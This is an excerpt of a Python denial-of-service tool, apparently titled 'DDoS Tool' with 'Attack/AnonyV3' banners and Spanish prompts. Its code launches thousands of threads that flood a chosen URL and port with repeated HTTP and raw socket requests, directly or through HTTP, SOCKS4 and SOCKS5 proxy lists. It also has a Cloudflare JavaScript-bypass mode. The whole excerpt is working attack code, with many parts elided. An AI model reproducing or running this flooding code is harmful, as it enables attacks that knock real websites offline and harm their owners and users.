...
def logo():
    if sys.platform.startswith("linux"):
        ...
        os.system('color ' +random.choice(['2'])+ " & cls & title DDoS Tool")
    print('''
...
def start_port():
    ...
    if port == '':
        if "https" in url:
                port = int(443)
                print("Puerto Seleccionado = 443")
        else:
            port = int(80)
            print("Puerto Seleccionado = 80")
    else:
        port = int(port)
...
""")
    ...
    if choice_mode == "0":
        ...
        filenam2 = "JS-Bypass"
        method_pass_cf = input("[?] Metodo [1/2]: ")
        if (method_pass_cf == "") or (method_pass_cf == "1"):
            print("Metodo Seleccionado Bypass JS v1")
            method_pass_cf = "1"
        else:
            print("Metodo Seleccionado Bypass JS v2")
            method_pass_cf = "2"
        logo()
        pass_cf()
    elif choice_mode == "4":
...
def choice_down_proxies():
    ...
    if (choice4 == "y") or (choice4 == "Y"):
        ...
        print("Seleccionado No Proxy List " +str(filenam2)+ " [!]")
        proxies_list()
...
def numthreads():
    ...
    try:
        print("-----------------------------")
        threads = int(input("Threads [2500]: "))
    except ValueError:
        threads = int(2500)
        print ("Potencia Seleccionada " +str(threads)+ " [!]\n")
    logo()
    begin()
        ...
        while True:
            try:
                if method_attack == "1":
                    ...
                    requests.get(url+ "/?=" +str(random.randint(0,20000)), headers=headersx)
                print("[+] Attack/AnonyV3 | Raw-DoS @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                while True:
                    try:
                        for _ in range(100):
                            if method_attack == "1":
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                #sys.stdout.flush()
                print("[!] Attack/AnonyV3 | Proxy @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                try:
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("[!] Attack/AnonyV3 | Socks5 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                ...
                try:
                    ...
                    if str(port) == '443':
                        s = ssl.wrap_socket(s)
                    s.send(str.encode(request))
                    print("[!] Attack/AnonyV3 | Socks4 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                    try:
                        for y in range(multiple):
                            s.send(str.encode(request))
                    except:
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("[+] Attack/AnonyV3 | Home @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                #req_code += 1
                #sys.stdout.write("[!] bit.ly/AnonyV28 | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                #sys.stdout.flush()
                try:
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                print("[+] Attack/AnonyV3 | JS-Normal @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
                try:
                    for y in range(multiple):
                        http.request("GET", url,headers=headersx)
                except:
